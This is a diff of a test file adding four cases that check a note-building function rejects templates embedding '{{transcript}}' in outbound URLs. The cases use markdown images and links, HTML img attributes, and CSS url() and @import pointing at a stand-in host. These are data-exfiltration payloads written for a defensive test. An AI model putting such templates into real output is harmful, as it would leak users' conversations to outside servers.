@@ -49,6 +49,10 @@ describe('buildNoteContent (M12)', () => {
     ['inside a link target', '[a](https://x.test/?d={{transcript}})'],
     ['in a reference definition', '[a]: https://x.test/?d={{transcript}}'],
     ['inside a style element', '<style>body{background:url(https://x.test/{{transcript}})}</style>'],
+    ['after a > inside a quoted attribute', '<img alt=">" src="https://x.test/?d={{transcript}}">'],
+    ['inside a link target with balanced parentheses', '![](https://x.test/?a=(b){{transcript}})'],
+    ['on the next line of an HTML tag', '<img\n  src="https://x.test/?d={{transcript}}">'],
+    ['in an @import of a style element that holds a blank line', '<style>\n\n@import "https://x.test/{{transcript}}";\n</style>'],
   ])('ignores a template that puts the transcript %s', (_where, template) => {
     expect(buildNoteContent(template, 'secret')).toEqual({ content: 'secret', templateIgnored: true });
   });
